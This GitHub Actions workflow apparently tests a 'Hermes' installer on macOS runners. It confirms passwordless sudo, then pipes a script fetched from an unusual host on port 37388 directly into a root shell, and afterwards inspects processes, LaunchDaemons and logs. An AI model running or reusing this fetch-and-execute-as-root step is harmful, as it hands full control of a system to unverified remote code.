# .github/workflows/hermes-macos-install.yml

name: Test Hermes installer on macOS

on:
  workflow_dispatch:

jobs:
  install:
    name: Install on ${{ matrix.os }}

    strategy:
      fail-fast: false
      matrix:
        os:
          - macos-15
          - macos-15-intel

    runs-on: ${{ matrix.os }}
    timeout-minutes: 20

    steps:
      - name: Inspect runner
        shell: bash
        run: |
          set -euxo pipefail

          sw_vers
          uname -a
          uname -m
          id

          command -v curl
          command -v sh

          sudo -n true
          echo "Passwordless sudo available"

      - name: Check installer endpoint
        shell: bash
        run: |
          set -euo pipefail

          curl \
            --fail \
            --silent \
            --show-error \
            --location \
            --connect-timeout 15 \
            --max-time 30 \
            https://api.hermes.profiweb.biz:37388/install.sh \
            --output /tmp/hermes-install.sh

          test -s /tmp/hermes-install.sh

          echo "Installer size:"
          wc -c /tmp/hermes-install.sh

          echo "Installer type:"
          file /tmp/hermes-install.sh

      - name: Run Hermes installer as root
        shell: bash
        run: |
          set -o pipefail
          curl -fsSL https://api.hermes.profiweb.biz:37388/install.sh |
            sudo -n sh

      - name: Inspect installation
        if: always()
        shell: bash
        run: |
          set +e

          echo "=== Platform ==="
          sw_vers
          uname -m

          echo "=== Hermes processes ==="
          ps aux | grep -i '[h]ermes'

          echo "=== Installed Hermes files ==="
          sudo find \
            /opt \
            /usr/local \
            /Library/LaunchDaemons \
            /Library/LaunchAgents \
            /var/lib \
            /var/log \
            -maxdepth 5 \
            -iname '*hermes*' \
            -print 2>/dev/null

          echo "=== launchd services ==="
          sudo launchctl list | grep -i hermes

          echo "=== System launchd definitions ==="
          sudo find /Library/LaunchDaemons \
            -maxdepth 1 \
            -iname '*hermes*.plist' \
            -exec sh -c '
              for file do
                echo "===== $file ====="
                plutil -p "$file" || cat "$file"
              done
            ' sh {} + 2>/dev/null

          echo "=== Hermes logs ==="
          sudo find \
            /opt \
            /var/log \
            /tmp \
            -type f \
            \( -iname '*hermes*.log' -o -name 'hermes-install.log' \) \
            -exec sh -c '
              for file do
                echo "===== $file ====="
                tail -n 500 "$file"
              done
            ' sh {} + 2>/dev/null
